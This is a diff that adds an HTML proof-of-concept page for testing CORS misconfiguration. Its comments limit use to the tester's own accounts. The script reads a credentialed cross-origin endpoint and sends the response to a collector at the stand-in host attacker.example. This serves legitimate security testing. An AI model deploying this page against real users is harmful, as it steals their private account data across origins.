@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<!--
+  exfil.html — benign CORS credentialed-read PoC (AUTHORIZED testing, OWN accounts only).
+
+  How to use (CORS_TESTING_GUIDE.md §11/§20):
+    1. Edit TARGET to the secret-bearing, credentialed endpoint you confirmed is CORS-misconfigured.
+    2. Edit COLLECT to a collector YOU control (your server / webhook.site).
+    3. Host this on an origin YOU control (the one the server reflects, e.g. https://evil.com).
+    4. Log in as TEST ACCOUNT A (your own), then visit this page in the SAME browser.
+    5. Your collector receives account A's secret -> proves evil.com can read it cross-origin.
+  Redact the secret in your report. Take the page down after. Never run against real users.
+-->
+<html><head><meta charset="utf-8"><title>cors poc</title></head>
+<body>
+<h2>CORS credentialed-read PoC</h2>
+<pre id="out">running…</pre>
+<script>
+  const TARGET  = "https://api.target.com/api/me";   // <-- the misconfigured, secret-bearing endpoint
+  const COLLECT = "https://attacker.example/collect"; // <-- YOUR collector
+
+  fetch(TARGET, { credentials: "include" })          // send the victim's cookies
+    .then(r => r.text())
+    .then(data => {
+      document.getElementById("out").textContent =
+        "Read cross-origin response (" + data.length + " bytes). Sent to collector.";
+      // benign exfil to your own collector:
+      try { navigator.sendBeacon(COLLECT, data); }
+      catch (e) { new Image().src = COLLECT + "?d=" + encodeURIComponent(data); }
+    })
+    .catch(err => {
+      document.getElementById("out").textContent =
+        "Read blocked (" + err + ") — endpoint likely NOT CORS-exploitable for credentials.";
+    });
+</script>
+</body></html>
